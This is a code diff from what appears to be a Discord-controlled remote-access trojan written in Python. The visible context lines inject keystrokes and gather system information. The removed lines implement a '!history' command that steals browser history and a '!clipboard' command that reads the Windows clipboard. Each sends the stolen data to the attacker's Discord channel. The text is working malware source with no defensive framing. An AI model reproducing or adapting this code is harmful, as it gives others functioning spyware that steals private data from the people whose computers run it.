@@ -274,38 +274,6 @@ async def on_message(message):
             else:
                 pyautogui.typewrite(message.content[7:])
 
-        if message.content == "!history":
-            import os
-            import browserhistory as bh
-            dict_obj = bh.get_browserhistory()
-            strobj = str(dict_obj).encode(errors='ignore')
-            with open("history.txt","a") as hist:
-                hist.write(str(strobj))
-            file = discord.File("history.txt", filename="history.txt")
-            await message.channel.send("[*] Command successfully executed", file=file)
-            os.remove("history.txt")
-
-        if message.content == "!clipboard":
-            import ctypes
-            import os
-            CF_TEXT = 1
-            kernel32 = ctypes.windll.kernel32
-            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
-            kernel32.GlobalLock.restype = ctypes.c_void_p
-            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
-            user32 = ctypes.windll.user32
-            user32.GetClipboardData.restype = ctypes.c_void_p
-            user32.OpenClipboard(0)
-            if user32.IsClipboardFormatAvailable(CF_TEXT):
-                data = user32.GetClipboardData(CF_TEXT)
-                data_locked = kernel32.GlobalLock(data)
-                text = ctypes.c_char_p(data_locked)
-                value = text.value
-                kernel32.GlobalUnlock(data_locked)
-                body = value.decode()
-                user32.CloseClipboard()
-                await message.channel.send(f"[*] Clipboard content is : {body}")
-
         if message.content == "!sysinfo":
             import platform
             info = platform.uname()
